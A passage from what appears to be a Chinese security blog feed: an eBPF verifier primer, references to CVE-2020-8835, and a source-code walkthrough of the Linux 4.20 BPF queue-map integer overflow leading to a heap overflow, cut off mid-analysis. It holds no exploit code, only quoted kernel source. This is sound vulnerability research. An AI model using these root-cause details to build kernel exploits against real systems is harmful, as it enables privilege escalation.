<p>[2] <a href="https://elixir.bootlin.com/linux/v5.6-rc5/source/kernel/bpf/verifier.c#L9984" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6-rc5/source/kernel/bpf/verifier.c#L9984</a></p>
<p>[3] <a href="https://github.com/DayJun/Blogs/blob/master/Articles/CVES/CVE-2020-8835/poc.c" target="_blank" rel="noopener">https://github.com/DayJun/Blogs/blob/master/Articles/CVES/CVE-2020-8835/poc.c</a></p>
<p>[4] <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-641cd7b06c911c5935c34f24850ea18690649917.tar.gz" target="_blank" rel="noopener">https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-641cd7b06c911c5935c34f24850ea18690649917.tar.gz</a></p>
]]></content>
      <categories>
        <category>CVE</category>
      </categories>
      <tags>
        <tag>Kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>初步了解Linux内核eBPF程序，以及资料参考</title>
    <url>/2020/04/12/%E5%88%9D%E6%AD%A5%E4%BA%86%E8%A7%A3Linux%E5%86%85%E6%A0%B8BPF%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<p>每周分享，很水轻喷</p>
<a id="more"></a>

<h1 id="bpf-insn"><a href="#bpf-insn" class="headerlink" title="bpf_insn"></a>bpf_insn</h1><p><code>bpf_insn</code>是一个结构体，代表一条bpf指令</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> &#123;</span></span><br><span class="line">	__u8	code;		<span class="comment">/* opcode */</span></span><br><span class="line">	__u8	dst_reg:<span class="number">4</span>;	<span class="comment">/* dest register */</span></span><br><span class="line">	__u8	src_reg:<span class="number">4</span>;	<span class="comment">/* source register */</span></span><br><span class="line">	__s16	off;		<span class="comment">/* signed offset */</span></span><br><span class="line">	__s32	imm;		<span class="comment">/* signed immediate constant */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中后三个字段并不总是被使用的，例如使用<code>mov</code>操作对寄存器赋值立即数的指令中，<code>src_reg</code>和<code>off</code>字段是无用的，须为0</p>
<h1 id="prog"><a href="#prog" class="headerlink" title="prog"></a>prog</h1><p>一般的编写方式是直接使用一个<code>bpf_insn</code>数组作为一个完整程序加载到内核中，在Kernel的源码目录中的<code>/samples/bpf/bpf_insn.h</code>文件中有宏定义了大部分指令，可以参考<a href="https://elixir.bootlin.com/linux/v5.6/source/samples/bpf/bpf_insn.h#L1" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/samples/bpf/bpf_insn.h#L1</a></p>
<p>还有相关的eBPF包括编写、加载到内核、使用的示例</p>
<p><a href="https://elixir.bootlin.com/linux/v5.6/source/samples/bpf/sock_example.c" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/samples/bpf/sock_example.c</a></p>
<h1 id="检查"><a href="#检查" class="headerlink" title="检查"></a>检查</h1><p>eBPF程序在载入内核之前，会先进行几段检查</p>
<h2 id="check-cfg"><a href="#check-cfg" class="headerlink" title="check_cfg"></a>check_cfg</h2><p>利用程序流程图，主要负责检查程序是否有独立的块，即无法到达的块</p>
<h2 id="do-check"><a href="#do-check" class="headerlink" title="do_check"></a>do_check</h2><p>模拟执行程序，检查是否有违法操作、有死循环等</p>
<h1 id="eBPF模块可能存在的漏洞点"><a href="#eBPF模块可能存在的漏洞点" class="headerlink" title="eBPF模块可能存在的漏洞点"></a>eBPF模块可能存在的漏洞点</h1><p>除去上篇文章分析的整数溢出这种漏洞外，我所了解的另外两个漏洞都是关于，内核在模拟执行eBPF程序的过程中与实际执行程序的过程中的某些操作略有不同，导致在检查过程中有些条件恒成立，如果该条件恒成立，那么检查的时候就不会去检查不成立的那一分支。而如果检查过程中恒成立的条件在实际执行的过程中可以构成不成立的情况，那么就可以执行非法代码，完成任意读写等操作</p>
<h1 id="一些参考学习的资料"><a href="#一些参考学习的资料" class="headerlink" title="一些参考学习的资料"></a>一些参考学习的资料</h1><p><a href="https://www.kernel.org/doc/Documentation/networking/filter.txt" target="_blank" rel="noopener">https://www.kernel.org/doc/Documentation/networking/filter.txt</a></p>
<p><a href="http://www.man7.org/linux/man-pages/man2/bpf.2.html" target="_blank" rel="noopener">http://www.man7.org/linux/man-pages/man2/bpf.2.html</a></p>
<p><a href="https://elixir.bootlin.com/linux/v5.6/source/samples/bpf/" target="_blank" rel="noopener">https://elixir.bootlin.com/linux/v5.6/source/samples/bpf/</a></p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux kernel 4.20 BPF 整数溢出漏洞</title>
    <url>/2020/04/04/Linux-kernel-4-20-BPF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p><code>Linux kernel 4.20-rc1-rc4</code>中存在一个整数溢出漏洞，导致堆溢出</p>
<a id="more"></a>

<h1 id="BPF"><a href="#BPF" class="headerlink" title="BPF"></a>BPF</h1><p>根据<code>man bpf</code>中的描述</p>
<blockquote>
<p>描述：</p>
<p>bpf系统调用执行一系列与extended Berkeley Packet Filters相关的操作，eBPF与传统的BPF相似，作用为    过滤网络包。对于eBPF和传统的BPF来说，为了确保它们进行的操作不会损伤运行时的系统，内核会在加    载程序之前静态地分析它们。</p>
</blockquote>
<blockquote>
<p>eBPF设计/架构：</p>
<p>++eBPF maps是一种通用的数据结构，它被用来存储不同的数据类型。数据类型通常被视为二进制块，所以++用户需要在创建maps的时候指定key和value的size，所以一个给定的键值对可以有任意的结构。一个用户进程可以创建多个maps，并可以通过文件描述符来访问它们。不同的eBPF程序可以平行地访问相同的maps。关于往maps中存什么完全是由用户进程和eBPF程序来决定的。</p>
<p>有一种特殊的map类型，被称为program array。这种map存储指向其他eBPF的文件描述符，当在该map中执行lookup的时候，程序流将被重定向到另一个eBPF程序的开头，而不会返回到正在调用的程序。嵌套的层数最大为32，所以无法实现无限循环。在运行时，在map中存储的文件描述符可以被修改，所以程序如果有什么特殊的需要的话是可以在功能上进行修改的。所有在program array中的程序都必须使用bpf系统调用提前加载到内核之中。如果map的lookup失败的话，程序会继续执行下去。</p>
<p>每一个eBPF程序都是一组指令，在完成之前都可以安全地执行。内核中的验证器会静态地确定程序终止或者安全地被执行。在验证的时候，内核会增加被验证的map的引用计数来确保被附加的map不能在程序卸载之前被移除。</p>
</blockquote>
<h1 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h1><p>调用bpf系统调用有以下两种方式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bpf</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">union</span> bpf_attr *attr, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span>;</span><br><span class="line">syscall(__NR_bpf, cmd, attr, size);</span><br></pre></td></tr></table></figure>

<p>其中，<code>bpf</code>函数似乎在<code>bpf.h</code>中并没有被声明，所以无法被调用，因此我使用的第二种方法</p>
<p>在<code>cmd</code>为<code>BPF_MAP_CREATE</code>即<code>0</code>的时候，根据代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE3(bpf, <span class="keyword">int</span>, cmd, <span class="keyword">union</span> bpf_attr __user *, uattr, <span class="keyword">unsigned</span> <span class="keyword">int</span>, size)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">union</span> bpf_attr attr = &#123;&#125;;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sysctl_unprivileged_bpf_disabled &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line">		<span class="keyword">return</span> -EPERM;</span><br><span class="line"></span><br><span class="line">	err = bpf_check_uarg_tail_zero(uattr, <span class="keyword">sizeof</span>(attr), size);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line">	size = <span class="keyword">min_t</span>(u32, size, <span class="keyword">sizeof</span>(attr));</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copy attributes from user space, may be less than sizeof(bpf_attr) */</span></span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(&amp;attr, uattr, size) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">	err = security_bpf(cmd, &amp;attr, size);</span><br><span class="line">	<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> BPF_MAP_CREATE:		&lt;&lt;-----------------------------------</span><br><span class="line">		err = map_create(&amp;attr);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">    ......</span><br></pre></td></tr></table></figure>

<p>得知，会调用<code>map_create</code>函数来创建一个<code>map</code></p>
<p>跟进map_create函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_create</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">int</span> f_flags;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	err = CHECK_ATTR(BPF_MAP_CREATE);</span><br><span class="line">	<span class="keyword">if</span> (err)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	f_flags = bpf_get_file_flag(attr-&gt;map_flags);</span><br><span class="line">	<span class="keyword">if</span> (f_flags &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> f_flags;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (numa_node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">	    ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)numa_node &gt;= nr_node_ids ||</span><br><span class="line">	     !node_online(numa_node)))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* find map type and init map: hashtable vs rbtree vs bloom vs ... */</span></span><br><span class="line">	<span class="built_in">map</span> = find_and_alloc_map(attr);		&lt;&lt;----------------------------------</span><br><span class="line">	........</span><br></pre></td></tr></table></figure>

<p>它是调用<code>find_and_alloc_map</code>来创建<code>map</code>的</p>
<p>跟进<code>find_and_alloc_map</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">find_and_alloc_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">	u32 type = attr-&gt;map_type;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (type &gt;= ARRAY_SIZE(bpf_map_types))</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line">	type = array_index_nospec(type, ARRAY_SIZE(bpf_map_types));		&lt;&lt;------------- <span class="number">1</span></span><br><span class="line">	ops = bpf_map_types[type];		&lt;&lt;----------------- <span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> (!ops)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-EINVAL);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ops-&gt;map_alloc_check) &#123;</span><br><span class="line">		err = ops-&gt;map_alloc_check(attr);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">return</span> ERR_PTR(err);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (attr-&gt;map_ifindex)</span><br><span class="line">		ops = &amp;bpf_map_offload_ops;</span><br><span class="line">	<span class="built_in">map</span> = ops-&gt;map_alloc(attr);		&lt;&lt;----------------- <span class="number">3</span></span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">	<span class="built_in">map</span>-&gt;ops = ops;</span><br><span class="line">	<span class="built_in">map</span>-&gt;map_type = type;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它在1处根据<code>map_type</code>来查找一个<code>type</code>，然后从<code>bpf_map_types</code>中以<code>type</code>为<code>index</code>来查找一个结构体，该结构体内存储着几个函数指针，其中在3处会调用<code>map_alloc</code>所指向的函数</p>
<p>如果我们的<code>map_type</code>传入<code>BPF_MAP_TYPE_QUEUE</code>的话，取出的<code>ops</code>会是</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> = &#123;</span></span><br><span class="line">	.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">	.map_alloc = queue_stack_map_alloc,</span><br><span class="line">	.map_free = queue_stack_map_free,</span><br><span class="line">	.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">	.map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">	.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">	.map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">	.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">	.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">	.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>因此在3处调用的就是<code>queue_stack_map_alloc</code>函数</p>
<p>跟进<code>queue_stack_map_alloc</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct bpf_map *<span class="title">queue_stack_map_alloc</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret, numa_node = bpf_map_attr_numa_node(attr);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span>;</span></span><br><span class="line">	u32 size, value_size;</span><br><span class="line">	u64 queue_size, cost;</span><br><span class="line"></span><br><span class="line">	size = attr-&gt;max_entries + <span class="number">1</span>;		&lt;&lt;--------------------- <span class="number">1</span></span><br><span class="line">	value_size = attr-&gt;value_size;</span><br><span class="line"></span><br><span class="line">	queue_size = <span class="keyword">sizeof</span>(*qs) + (u64) value_size * size;</span><br><span class="line"></span><br><span class="line">	cost = queue_size;</span><br><span class="line">	<span class="keyword">if</span> (cost &gt;= U32_MAX - PAGE_SIZE)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-E2BIG);</span><br><span class="line"></span><br><span class="line">	cost = round_up(cost, PAGE_SIZE) &gt;&gt; PAGE_SHIFT;</span><br><span class="line"></span><br><span class="line">	ret = bpf_map_precharge_memlock(cost);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(ret);</span><br><span class="line"></span><br><span class="line">	qs = bpf_map_area_alloc(queue_size, numa_node);		&lt;&lt;------------------ <span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> (!qs)</span><br><span class="line">		<span class="keyword">return</span> ERR_PTR(-ENOMEM);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(qs, <span class="number">0</span>, <span class="keyword">sizeof</span>(*qs));</span><br><span class="line"></span><br><span class="line">	bpf_map_init_from_attr(&amp;qs-&gt;<span class="built_in">map</span>, attr);</span><br><span class="line"></span><br><span class="line">	qs-&gt;<span class="built_in">map</span>.pages = cost;</span><br><span class="line">	qs-&gt;size = size;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock_init(&amp;qs-&gt;lock);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> &amp;qs-&gt;<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>1处<code>size = attr-&gt;max_entries + 1</code>，这里<code>attr-&gt;max_entries</code>是一个<code>u32</code>，而它的值是用户传入的</p>
<p>那么如果用户传入一个<code>0xffffffff</code>，<code>size</code>就会是0</p>
<p>由<code>queue_size = sizeof(*qs) + (u64) value_size * size;</code>得，<code>queue_size</code>为<code>sizeof(*qs)</code>，并将它作为一个参数传入<code>bpf_map_area_alloc</code>函数</p>
<p>跟进<code>bpf_map_area_alloc</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">bpf_map_area_alloc</span><span class="params">(<span class="keyword">size_t</span> size, <span class="keyword">int</span> numa_node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* We definitely need __GFP_NORETRY, so OOM killer doesn't</span></span><br><span class="line"><span class="comment">	 * trigger under memory pressure as we really just want to</span></span><br><span class="line"><span class="comment">	 * fail instead.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">gfp_t</span> flags = __GFP_NOWARN | __GFP_NORETRY | __GFP_ZERO;</span><br><span class="line">	<span class="keyword">void</span> *area;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (size &lt;= (PAGE_SIZE &lt;&lt; PAGE_ALLOC_COSTLY_ORDER)) &#123;</span><br><span class="line">		area = kmalloc_node(size, GFP_USER | flags, numa_node);</span><br><span class="line">		<span class="keyword">if</span> (area != <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> area;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> __vmalloc_node_flags_caller(size, numa_node, GFP_KERNEL | flags,</span><br><span class="line">					   __builtin_return_address(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出来该函数是根据<code>size</code>为该<code>map</code>分配堆内存</p>
<p>这里其实就明白，上面的函数中发生了整数溢出，导致分配出来的堆比实际需要的堆要小</p>
<h1 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h1><p>再回到第一个函数，如果<code>cmd</code>为<code>BPF_MAP_UPDATE_ELEM</code>即<code>2</code>的时候</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_CREATE:</span><br><span class="line">	err = map_create(&amp;attr);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_LOOKUP_ELEM:</span><br><span class="line">	err = map_lookup_elem(&amp;attr);</span><br><span class="line">	<span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> BPF_MAP_UPDATE_ELEM:</span><br><span class="line">	err = map_update_elem(&amp;attr);</span><br><span class="line">   ......</span><br></pre></td></tr></table></figure>

<p>就会调用<code>map_update_elem</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">map_update_elem</span><span class="params">(<span class="keyword">union</span> bpf_attr *attr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> __user *ukey = u64_to_user_ptr(attr-&gt;key);</span><br><span class="line">	<span class="keyword">void</span> __user *uvalue = u64_to_user_ptr(attr-&gt;value);</span><br><span class="line">	<span class="keyword">int</span> ufd = attr-&gt;map_fd;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_map</span> *<span class="title">map</span>;</span></span><br><span class="line">	<span class="keyword">void</span> *key, *value;</span><br><span class="line">	u32 value_size;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span>;</span></span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CHECK_ATTR(BPF_MAP_UPDATE_ELEM))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	f = fdget(ufd);</span><br><span class="line">	<span class="built_in">map</span> = __bpf_map_get(f);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">map</span>))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(<span class="built_in">map</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!(f.file-&gt;f_mode &amp; FMODE_CAN_WRITE)) &#123;</span><br><span class="line">		err = -EPERM;</span><br><span class="line">		<span class="keyword">goto</span> err_put;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	key = __bpf_copy_key(ukey, <span class="built_in">map</span>-&gt;key_size);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(key)) &#123;</span><br><span class="line">		err = PTR_ERR(key);</span><br><span class="line">		<span class="keyword">goto</span> err_put;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE)</span><br><span class="line">		value_size = round_up(<span class="built_in">map</span>-&gt;value_size, <span class="number">8</span>) * num_possible_cpus();</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		value_size = <span class="built_in">map</span>-&gt;value_size;</span><br><span class="line"></span><br><span class="line">	err = -ENOMEM;</span><br><span class="line">	value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</span><br><span class="line">	<span class="keyword">if</span> (!value)</span><br><span class="line">		<span class="keyword">goto</span> free_key;</span><br><span class="line"></span><br><span class="line">	err = -EFAULT;</span><br><span class="line">	<span class="keyword">if</span> (copy_from_user(value, uvalue, value_size) != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_value;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Need to create a kthread, thus must support schedule */</span></span><br><span class="line">	<span class="keyword">if</span> (bpf_map_is_dev_bound(<span class="built_in">map</span>)) &#123;</span><br><span class="line">		err = bpf_map_offload_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_CPUMAP ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKHASH ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_SOCKMAP) &#123;</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* must increment bpf_prog_active to avoid kprobe+bpf triggering from</span></span><br><span class="line"><span class="comment">	 * inside bpf map update or delete otherwise deadlocks are possible</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	preempt_disable();</span><br><span class="line">	__this_cpu_inc(bpf_prog_active);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH) &#123;</span><br><span class="line">		err = bpf_percpu_hash_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY) &#123;</span><br><span class="line">		err = bpf_percpu_array_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) &#123;</span><br><span class="line">		err = bpf_percpu_cgroup_storage_update(<span class="built_in">map</span>, key, value,</span><br><span class="line">						       attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_FD_ARRAY(<span class="built_in">map</span>)) &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = bpf_fd_array_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">						   attr-&gt;flags);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_HASH_OF_MAPS) &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = bpf_fd_htab_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">						  attr-&gt;flags);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_REUSEPORT_SOCKARRAY) &#123;</span><br><span class="line">		<span class="comment">/* rcu_read_lock() is not needed */</span></span><br><span class="line">		err = bpf_fd_reuseport_array_update_elem(<span class="built_in">map</span>, key, value,</span><br><span class="line">							 attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="built_in">map</span>, value, attr-&gt;flags);		&lt;&lt;-------------</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);		</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125;</span><br><span class="line">	__this_cpu_dec(bpf_prog_active);</span><br><span class="line">	preempt_enable();</span><br><span class="line">	maybe_wait_bpf_programs(<span class="built_in">map</span>);</span><br><span class="line">out:</span><br><span class="line">free_value:</span><br><span class="line">	kfree(value);</span><br><span class="line">free_key:</span><br><span class="line">	kfree(key);</span><br><span class="line">err_put:</span><br><span class="line">	fdput(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于我们的<code>map_type</code>为<code>BPF_MAP_TYPE_QUEUE</code>，因此它会执行箭头所指的函数</p>
<p>还是根据这个结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_ops</span> <span class="title">queue_map_ops</span> = &#123;</span></span><br><span class="line">	.map_alloc_check = queue_stack_map_alloc_check,</span><br><span class="line">	.map_alloc = queue_stack_map_alloc,</span><br><span class="line">	.map_free = queue_stack_map_free,</span><br><span class="line">	.map_lookup_elem = queue_stack_map_lookup_elem,</span><br><span class="line">	.map_update_elem = queue_stack_map_update_elem,</span><br><span class="line">	.map_delete_elem = queue_stack_map_delete_elem,</span><br><span class="line">	.map_push_elem = queue_stack_map_push_elem,</span><br><span class="line">	.map_pop_elem = queue_map_pop_elem,</span><br><span class="line">	.map_peek_elem = queue_map_peek_elem,</span><br><span class="line">	.map_get_next_key = queue_stack_map_get_next_key,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们跟进<code>queue_stack_map_push_elem</code></p>
